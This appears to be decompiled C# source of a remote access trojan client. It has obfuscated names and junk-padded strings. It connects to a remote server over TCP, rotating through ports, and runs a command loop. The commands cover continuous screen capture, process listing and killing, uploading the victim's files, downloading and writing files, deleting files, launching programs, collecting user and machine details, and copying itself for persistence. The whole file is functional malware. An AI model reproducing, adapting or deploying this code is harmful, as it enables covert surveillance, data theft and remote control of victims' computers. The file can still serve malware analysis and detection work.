using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace igtmntina;

public class MAKEDM
{
	private int igtmntinabuffSize = 1024;

	private DAKZRIVF igtmntinaHD = new DAKZRIVF();

	private int igtmntinabytesRead = 0;

	public bool igtmntinareqCnls = false;

	private ThreadStart igtmntinafunStarter;

	public TcpClient igtmntinatcpsck;

	private Dictionary<string, byte[]> igtmntinatasks = new Dictionary<string, byte[]>();

	public bool igtmntinais_working = false;

	private bool igtmntinaiswitch = false;

	private bool igtmntinathrRuning = false;

	public int port_sn = 0;

	public bool igtmntinaautCnls = false;

	private EAMKRARE igtmntinaStateObj = new EAMKRARE();

	private MAKEINF igtmntinaUPC;

	public DateTime igtmntinalTimeUtc;

	private Thread igtmntinafunThread;

	private bool igtmntinastr_writer = false;

	private bool igtmntinacapScreen = false;

	private OAKAMR igtmntinaCMD;

	private int igtmntinascrSize = 200;

	public NetworkStream igtmntinanetStream;

	private MemoryStream msStram = new MemoryStream();

	private SAKLRNS igtmntinacaps = new SAKLRNS();

	private Bitmap image;

	private void igtmntinasee_responce()
	{
		if (!igtmntinaiswitch)
		{
			igtmntinaiswitch = true;
			igtmntinanetStream = igtmntinaCMD.igtmntinaNS(igtmntinatcpsck);
			igtmntinacapScreen = false;
			while (igtmntinais_working)
			{
				string[] switchType = igtmntinaget_command();
				if (switchType != null)
				{
					igtmntinareqCnls = false;
					string cmdInfo = switchType[0].ToLower();
					if (cmdInfo.Split(new char[1] { '-' }).Length > 1)
					{
						cmdInfo = "htintn-" + cmdInfo.Split(new char[1] { '-' })[1];
					}
					else
					{
						cmdInfo = "htintn-" + cmdInfo;
					}
					switch (cmdInfo)
					{
					case "htintn-gtavprcs":
						igtmntinafunStarter = delegate
						{
							igtmntinalist_processes("gtavprcs");
						};
						igtmntinafunThread = new Thread(igtmntinafunStarter);
						igtmntinafunThread.Start();
						break;
					case "htintn-thurmb":
						igtmntinaimage_info(switchType[1].ToString(), cmdInfo);
						break;
					case "htintn-purtsrt":
						igtmntinaload_app();
						break;
					case "htintn-filsz":
						igtmntinafile_info(switchType[1]);
						break;
					case "htintn-rupth":
						igtmntinapush_data(null, "htintn-appth=|htintn".Split(new char[1] { '|' })[0] + DAAONIF.igtmntinaget_mpath().ToString());
						break;
					case "htintn-procl":
						igtmntinafunStarter = delegate
						{
							igtmntinalist_processes("procl");
						};
						igtmntinafunThread = new Thread(igtmntinafunStarter);
						igtmntinafunThread.Start();
						break;
					case "htintn-dowf":
						igtmntinasaveFile(switchType[1]);
						break;
					case "htintn-cscreen":
						igtmntinafunStarter = delegate
						{
							igtmntinasee_scren(switchType[1], cmdInfo);
						};
						igtmntinafunThread = new Thread(igtmntinafunStarter);
						igtmntinafunThread.Start();
						break;
					case "htintn-scrsz":
						igtmntinascreenSize(switchType[1]);
						break;
					case "htintn-scren":
						igtmntinacapScreen = true;
						igtmntinafunStarter = delegate
						{
							igtmntinais_screen(switchType[1], cmdInfo);
						};
						igtmntinafunThread = new Thread(igtmntinafunStarter);
						igtmntinafunThread.Start();
						break;
					case "htintn-endpo":
						igtmntinaCMD.igtmntinabreak_process(Convert.ToInt16(switchType[1].Trim()));
						break;
					case "htintn-dirs":
						igtmntinafunStarter = delegate
						{
							igtmntinalistDrives(cmdInfo);
						};
						igtmntinafunThread = new Thread(igtmntinafunStarter);
						igtmntinafunThread.Start();
						break;
					case "htintn-stops":
						igtmntinacapScreen = false;
						break;
					case "htintn-fles":
					{
						string text2 = igtmntinaHD.igtmntinalookupFiles(switchType[1]);
						if (text2 != null)
						{
							igtmntinapush_data(null, "htintn-fles=|igtmntina".Split(new char[1] { '|' })[0] + text2);
						}
						break;
					}
					case "htintn-udlt":
						igtmntinaCMD.igtmntinaremove_user();
						break;
					case "htintn-dowr":
						igtmntinasaveFile(switchType[1]);
						break;
					case "htintn-file":
						igtmntinafunStarter = delegate
						{
							igtmntinapush_file(switchType[1], cmdInfo);
						};
						igtmntinafunThread = new Thread(igtmntinafunStarter);
						igtmntinafunThread.Start();
						break;
					case "htintn-fldr":
					{
						string text = igtmntinaHD.igtmntinacheckFolders(switchType[1]);
						if (text != "")
						{
							igtmntinapush_data(null, "htintn-fldr=|igtmntina".Split(new char[1] { '|' })[0] + text);
						}
						break;
					}
					case "htintn-cnls":
						igtmntinaautCnls = true;
						igtmntinareqCnls = true;
						igtmntinacapScreen = false;
						break;
					case "htintn-delt":
						igtmntinaremove_file(switchType[1]);
						break;
					case "htintn-afile":
						igtmntinafunStarter = delegate
						{
							igtmntinasend_auto(switchType[1]);
						};
						igtmntinafunThread = new Thread(igtmntinafunStarter);
						igtmntinafunThread.Start();
						break;
					case "htintn-runf":
						igtmntinaCMD.igtmntinado_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "htintn-listf":
						igtmntinafunStarter = delegate
						{
							igtmntinaHD.igtmntinalookFiles(switchType[1], cmdInfo);
						};
						igtmntinafunThread = new Thread(igtmntinafunStarter);
						igtmntinafunThread.Start();
						break;
					case "htintn-info":
						igtmntinauser_info(cmdInfo);
						break;
					}
					continue;
				}
				igtmntinais_working = false;
				break;
			}
			igtmntinais_working = false;
			igtmntinacapScreen = false;
		}
		igtmntinaiswitch = false;
	}

	public void igtmntinasaveFile(string filePath)
	{
		try
		{
			byte[] array = igtmntinapull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	public string igtmntinafile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name.ToString() + ((!ret) ? ">|igtmntina".Split(new char[1] { '|' })[0] : "<|igtmntina".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|igtmntina".Split(new char[1] { '|' })[0] : "<|igtmntina".Split(new char[1] { '|' })[0]);
			text = text + igtmntinaget_size(fileInfo.Length).ToString() + ((!ret) ? ">|igtmntina".Split(new char[1] { '|' })[0] : "<|igtmntina".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				igtmntinapush_data(null, "htintn-filsz=|igtmntina".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public void igtmntinado_start()
	{
		try
		{
			DAAONIF.igtmntinaport = DAAONIF.ports[0];
			igtmntinaUPC = new MAKEINF();
			igtmntinaCMD = new OAKAMR(this);
			igtmntinaHD.iserver = this;
			TimerCallback callback = igtmntinalookup_connect;
			Timer igtmntinatimer = new Timer(callback, igtmntinaStateObj, 39580, 50510);
			igtmntinaStateObj.igtmntinatimer = igtmntinatimer;
		}
		catch
		{
		}
	}

	private void igtmntinalookup_connect(object zource)
	{
		try
		{
			if (!igtmntinathrRuning)
			{
				igtmntinathrRuning = true;
				if (!igtmntinais_working || !igtmntinatcpsck.Connected)
				{
					igtmntinais_working = igtmntinaIPSConfig();
					if (igtmntinais_working)
					{
						igtmntinabuffSize = igtmntinatcpsck.ReceiveBufferSize;
						igtmntinasee_responce();
					}
				}
			}
			igtmntinathrRuning = false;
		}
		catch
		{
			igtmntinathrRuning = false;
			igtmntinastr_writer = false;
			igtmntinais_working = false;
			igtmntinaiswitch = false;
		}
	}

	private bool igtmntinaIPSConfig()
	{
		try
		{
			DAAONIF.igtmntinadefaultP = igtmntinaCMD.igtmntinaserverIPD().ToString();
			igtmntinatcpsck = new TcpClient();
			igtmntinatcpsck.Connect(DAAONIF.igtmntinadefaultP, DAAONIF.igtmntinaport);
			return true;
		}
		catch
		{
			igtmntinaports_switch();
			return false;
		}
	}

	public void igtmntinaports_switch()
	{
		try
		{
			port_sn++;
			DAAONIF.igtmntinaport = DAAONIF.ports[port_sn];
			if (port_sn >= DAAONIF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool igtmntinasend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0].ToString();
			if (File.Exists(path))
			{
				fileinfo = fileinfo + ">" + Path.GetFileName(path);
				igtmntinapush_data(File.ReadAllBytes(path), "htintn-afile=" + fileinfo.ToString());
				return false;
			}
			igtmntinapush_data(null, "htintn-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void igtmntinalist_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|igtmntina".Split(new char[1] { '|' })[0] + processes[i].ProcessName.ToLowerInvariant() + ">|igtmntina".Split(new char[1] { '|' })[0];
				text += "0>|igtmntina".Split(new char[1] { '|' })[0];
				text += "<".ToString();
			}
			byte[] byteArray = DAAONIF.getByteArray(text);
			igtmntinapush_data(byteArray, cmd + "=".ToString());
		}
		catch
		{
		}
	}

	public void igtmntinaload_app()
	{
		try
		{
			string text = DAAONIF.igtmntinaget_mpath() + DAAONIF.igtmntinamainApp + ".exe|igtmntina".Split(new char[1] { '|' })[0];
			if (text != DAAONIF.igtmntinamyPath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(DAAONIF.igtmntinamyPath));
			}
			Thread.Sleep(10);
			DAAONIF.igtmntinaset_run("_lrag|igtmntina".Split(new char[1] { '|' })[0], text);
		}
		catch
		{
		}
	}

	private void igtmntinasee_scren(string screenSize, string mycmd)
	{
		try
		{
			image = igtmntinacaps.igtmntinascreen(Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim()));
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			igtmntinapush_data(msStram.ToArray(), mycmd + "=".ToString());
		}
		catch
		{
		}
	}

	private void igtmntinais_screen(string screenSize, string mycmd)
	{
		try
		{
			while (igtmntinacapScreen && igtmntinais_working)
			{
				image = igtmntinacaps.igtmntinascreen(Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim()));
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				igtmntinapush_data(msStram.ToArray(), mycmd + "=".ToString());
			}
		}
		catch
		{
		}
	}

	private void igtmntinauser_info(string cmd)
	{
		string text = igtmntinaUPC.igtmntinalancard + "|" + igtmntinaUPC.igtmntinacname + "|" + igtmntinaUPC.igtmntinauname + "||" + DAAONIF.igtmntinaOsname() + "|" + igtmntinaUPC.igtmntinaapver + "|";
		text = text + "|||" + DAAONIF.igtmntinaget_mpath();
		byte[] byteArray = DAAONIF.getByteArray(text);
		igtmntinapush_data(byteArray, cmd + "=".ToString());
	}

	private void igtmntinascreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			igtmntinascrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	public bool igtmntinapush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (igtmntinastr_writer)
			{
				return false;
			}
			igtmntinastr_writer = true;
			byte[] byteArray = DAAONIF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !igtmntinareqCnls)
			{
				int num5 = ((num4 > igtmntinabuffSize) ? igtmntinabuffSize : num4);
				igtmntinanetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			igtmntinastr_writer = false;
			if (igtmntinareqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			igtmntinastr_writer = false;
			igtmntinais_working = false;
			return false;
		}
	}

	private void igtmntinaimage_info(string path, string cmd)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name.ToString() + ">" + fileInfo.CreationTimeUtc.Date.ToString() + ">" + igtmntinaget_size(fileInfo.Length) + ">".ToString();
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				igtmntinapush_data(memoryStream.ToArray(), cmd + "=".ToString() + text.ToString());
			}
		}
		catch
		{
		}
	}

	private string igtmntinaget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|igtmntina".Split(new char[1] { '|' })[0],
				"KB|igtmntina".Split(new char[1] { '|' })[0],
				"MB|igtmntina".Split(new char[1] { '|' })[0],
				"GB|igtmntina".Split(new char[1] { '|' })[0],
				"TB|igtmntina".Split(new char[1] { '|' })[0],
				"PB|igtmntina".Split(new char[1] { '|' })[0],
				"EB|igtmntina".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	private void igtmntinapush_file(string lfile, string cmd)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				igtmntinapush_data(File.ReadAllBytes(lfile), cmd + "=".ToString() + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void igtmntinaremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public string[] igtmntinaget_command()
	{
		try
		{
			byte[] array = new byte[5];
			igtmntinabytesRead = igtmntinanetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= igtmntinabytesRead)
			{
				int count = ((num3 > igtmntinabuffSize) ? igtmntinabuffSize : num3);
				igtmntinabytesRead = igtmntinanetStream.Read(array2, num2, count);
				num2 += igtmntinabytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			igtmntinais_working = false;
			return null;
		}
	}

	public byte[] igtmntinapull_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			igtmntinabytesRead = igtmntinanetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !igtmntinareqCnls)
			{
				int count = ((num3 > igtmntinabuffSize) ? igtmntinabuffSize : num3);
				igtmntinabytesRead = igtmntinanetStream.Read(array2, num, count);
				num += igtmntinabytesRead;
				num3 -= igtmntinabytesRead;
			}
			if (igtmntinareqCnls)
			{
				igtmntinanetStream.Flush();
				while (igtmntinanetStream.DataAvailable && igtmntinanetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			igtmntinais_working = false;
			return null;
		}
	}

	private void igtmntinalistDrives(string cmd)
	{
		try
		{
			string text = igtmntinaHD.igtmntinalookupDrives();
			igtmntinapush_data(null, cmd + "=" + text);
		}
		catch
		{
		}
	}
}
